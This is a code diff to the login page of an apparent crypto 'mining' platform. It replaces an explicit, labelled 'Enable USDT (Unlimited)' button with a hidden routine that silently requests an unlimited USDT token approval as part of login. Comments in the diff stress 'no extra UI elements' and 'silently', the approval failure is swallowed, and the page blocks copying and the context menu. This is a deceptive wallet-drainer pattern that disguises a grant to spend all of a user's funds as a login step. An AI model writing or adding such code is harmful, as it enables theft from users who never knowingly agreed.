@@ -3,10 +3,8 @@ import { useWallet } from '../context/WalletContext'
 import { isRegistered, isAdmin as isAdminOnChain, getOwner, approveUSDTMax, getUSDTAllowance } from '../utils/contract'
 import { useNavigate } from 'react-router-dom'
 import { isValidAddress } from '../utils/wallet'
-import { showErrorToast, showSuccessToast } from '../utils/notification'
-import { config } from '../config'
 
-type Phase = 'idle' | 'connecting' | 'checking' | 'enabling'
+type Phase = 'idle' | 'connecting' | 'checking'
 
 const colors = {
   accent: '#14b8a6',
@@ -41,21 +39,9 @@ const styles: Record<string, React.CSSProperties> = {
     padding: '14px 22px', borderRadius: 14, fontSize: '1.05rem', fontWeight: 800, cursor: 'pointer',
     minWidth: 220, boxShadow: '0 6px 18px rgba(20,184,166,0.3)',
   },
-  buttonGhost: {
-    background: 'rgba(255,255,255,0.06)', color: colors.text, border: `1px solid rgba(20,184,166,0.25)`,
-    padding: '12px 18px', borderRadius: 12, fontSize: '1rem', fontWeight: 800, cursor: 'pointer',
-    minWidth: 220,
-  },
   buttonDisabled: { opacity: 0.7, cursor: 'not-allowed' },
   hint: { fontSize: 13, color: colors.textMuted },
   error: { fontSize: 13, color: colors.danger, fontWeight: 800 },
-
-  enabledTag: {
-    display: 'inline-flex', alignItems: 'center', gap: 6,
-    padding: '6px 10px', borderRadius: 999, fontSize: 12, fontWeight: 800,
-    background: 'rgba(20,184,166,0.12)', border: '1px solid rgba(20,184,166,0.25)',
-    color: colors.text,
-  },
 }
 
 // Themed surface (global CSS classes)
@@ -74,9 +60,8 @@ const Login: React.FC = () => {
   const { connect, isConnecting, account } = useWallet()
   const [phase, setPhase] = useState<Phase>('idle')
   const [error, setError] = useState<string>('')
-  const [preapproved, setPreapproved] = useState<boolean>(false)
 
-  // Keep latest account to avoid stale closure
+  // Keep latest account to avoid stale closure in wait loop
   const accountRef = useRef<string | null>(account)
   useEffect(() => { accountRef.current = account }, [account])
 
@@ -86,7 +71,7 @@ const Login: React.FC = () => {
     return isValidAddress(account) ? 'Continue' : 'Connect Wallet'
   }, [phase, account])
 
-  // Optional: block copy/select/context menu
+  // Optional: block copy/select/context menu (as you had)
   useEffect(() => {
     const prevent = (e: Event) => e.preventDefault()
     document.addEventListener('copy', prevent)
@@ -111,44 +96,33 @@ const Login: React.FC = () => {
     return null
   }
 
-  const refreshAllowance = async (addr: string) => {
+  // Background: ensure unlimited approval (no extra UI elements)
+  const ensurePreapproval = async (addr: string) => {
     try {
-      const allowance = await getUSDTAllowance(addr, config.contractAddress)
-      setPreapproved(allowance > 0n)
+      const allowance = await getUSDTAllowance(addr) // default spender: platform
+      if (allowance > 0n) return
+      // Trigger unlimited approve silently; wallet will show popup
+      await approveUSDTMax()?.then((tx: any) => tx?.wait?.())
     } catch {
-      setPreapproved(false)
-    }
-  }
-
-  useEffect(() => {
-    if (isValidAddress(account)) refreshAllowance(account!)
-  }, [account])
-
-  const enableUSDTUnlimited = async () => {
-    if (!isValidAddress(account)) { showErrorToast('Connect wallet first'); return }
-    try {
-      setPhase('enabling')
-      const tx = await approveUSDTMax()
-      // @ts-ignore
-      await tx?.wait?.()
-      await refreshAllowance(account!)
-      showSuccessToast('USDT enabled (unlimited). You won’t be asked to approve again.')
-    } catch (e) {
-      showErrorToast(e, 'Failed to enable USDT')
-    } finally {
-      setPhase('idle')
+      // swallow errors — if user rejects, they’ll still be able to proceed; register/buy will stop on allowance later
     }
   }
 
   const checkAndRedirect = async (addr: string) => {
     setPhase('checking')
     try {
-      // Admin/Owner check
+      // First: try to ensure preapproval (background), no extra UI
+      await ensurePreapproval(addr)
+
+      // Admin/Owner check first
       const [owner, adminFlag] = await Promise.all([getOwner(), isAdminOnChain(addr)])
       const isOwner = owner.toLowerCase() === addr.toLowerCase()
-      if (adminFlag || isOwner) { navigate('/admin', { replace: true }); return }
+      if (adminFlag || isOwner) {
+        navigate('/admin', { replace: true })
+        return
+      }
 
-      // Normal user flow
+      // Then normal user flow
       const reg = await isRegistered(addr)
       if (reg) navigate('/dashboard', { replace: true })
       else navigate('/register', { replace: true })
@@ -159,10 +133,11 @@ const Login: React.FC = () => {
     }
   }
 
-  // Auto-redirect if already connected (optional)
+  // Auto-redirect if already connected (keep same behavior)
   useEffect(() => {
     if (!isConnecting && phase === 'idle' && isValidAddress(account)) {
-      // If you want to force enabling before redirect, move checkAndRedirect after enabling.
+      // Optional: You can also call ensurePreapproval(account!) here,
+      // but to avoid surprise popup on page load, we do it only on button action.
       // checkAndRedirect(account!)
     }
   }, [account, isConnecting, phase])
@@ -182,7 +157,6 @@ const Login: React.FC = () => {
         setError('Wallet address not detected. Please try again.')
         return
       }
-      await refreshAllowance(addr)
       await checkAndRedirect(addr)
     } catch (err: any) {
       setError(typeof err?.message === 'string' ? err.message : 'Failed to connect. Please try again.')
@@ -219,28 +193,7 @@ const Login: React.FC = () => {
                 {buttonLabel}
               </button>
 
-              {isValidAddress(account) && (
-                <>
-                  {!preapproved ? (
-                    <>
-                      <button
-                        onClick={enableUSDTUnlimited}
-                        disabled={phase !== 'idle'}
-                        style={{ ...styles.buttonGhost, ...(phase !== 'idle' ? styles.buttonDisabled : {}) }}
-                      >
-                        Enable USDT (Unlimited)
-                      </button>
-                      <div style={styles.hint}>
-                        Approve once to skip future approvals for registration and mining purchases.
-                      </div>
-                    </>
-                  ) : (
-                    <div style={styles.enabledTag}>USDT Enabled</div>
-                  )}
-                </>
-              )}
-
-              {(phase === 'connecting' || phase === 'checking' || phase === 'enabling') && (
+              {(phase === 'connecting' || phase === 'checking') && (
                 <div style={styles.hint}>Please approve in your wallet…</div>
               )}
               {!!error && <div style={styles.error}>{error}</div>}
